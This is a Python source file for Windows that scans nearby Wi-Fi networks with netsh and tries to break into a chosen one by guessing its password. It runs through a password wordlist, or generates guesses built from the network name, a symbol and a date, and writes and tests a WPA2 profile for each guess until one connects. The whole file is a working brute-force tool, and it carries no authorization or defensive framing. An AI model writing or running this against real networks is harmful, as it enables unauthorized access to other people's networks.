
import subprocess
import time
import os
from datetime import datetime

class WifiManager:
    def scan_networks(self):
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], capture_output=True, text=True)
            ssids = set()
            for line in result.stdout.split('\n'):
                if "SSID" in line and " : " in line:
                    ssid = line.split(" : ")[1].strip()
                    if ssid:
                        ssids.add(ssid)
            return sorted(ssids)
        except Exception:
            return []

    def connect_with_profile(self, ssid, profile_path):
        subprocess.call(['netsh', 'wlan', 'add', 'profile', f'filename={profile_path}', 'user=all'])
        subprocess.call(['netsh', 'wlan', 'connect', f'name={ssid}', f'ssid={ssid}'])
        return f"Attempted to connect to {ssid} using XML profile.\n"

    def connect_with_passwords(self, ssid, password_file):
        results = []
        with open(password_file, 'r') as f:
            for pwd in f:
                pwd = pwd.strip()
                success = self.try_password(ssid, pwd)
                results.append(success)
                if "[+]" in success:
                    break
        return results

    def connect_with_algorithm(self, ssid):
        symbols = ['@', '#', '$', '!', '*']
        results = []

        for symbol in symbols:
            for y in range(1976, 2025):
                for m in range(1, 13):
                    for d in range(1, 32):
                        date_parts = [
                            f"{d:02}{m:02}{y}",
                            f"{d:02}{m:02}",
                            f"{y}"
                        ]
                        for part in date_parts:
                            guess = f"{ssid}{symbol}{part}"
                            result = self.try_password(ssid, guess)
                            results.append(result)
                            if "[+]" in result:
                                return results
        return results

    def try_password(self, ssid, password):
        profile = f"""<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
<name>{ssid}</name>
<SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
<connectionType>ESS</connectionType>
<connectionMode>auto</connectionMode>
<MSM>
<security>
<authEncryption>
<authentication>WPA2PSK</authentication>
<encryption>AES</encryption>
<useOneX>false</useOneX>
</authEncryption>
<sharedKey>
<keyType>passPhrase</keyType>
<protected>false</protected>
<keyMaterial>{password}</keyMaterial>
</sharedKey>
</security>
</MSM>
</WLANProfile>"""
        temp_file = f"{ssid}_temp.xml"
        with open(temp_file, 'w') as f:
            f.write(profile)

        subprocess.call(['netsh', 'wlan', 'add', 'profile', f'filename={temp_file}', 'user=all'])
        subprocess.call(['netsh', 'wlan', 'connect', f'name={ssid}', f'ssid={ssid}'])
        time.sleep(3)
        os.remove(temp_file)

        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
        if ssid in result.stdout and "State                  : connected" in result.stdout:
            return f"[+] Connected with password: {password}\n"
        else:
            return f"[-] Failed with password: {password}\n"
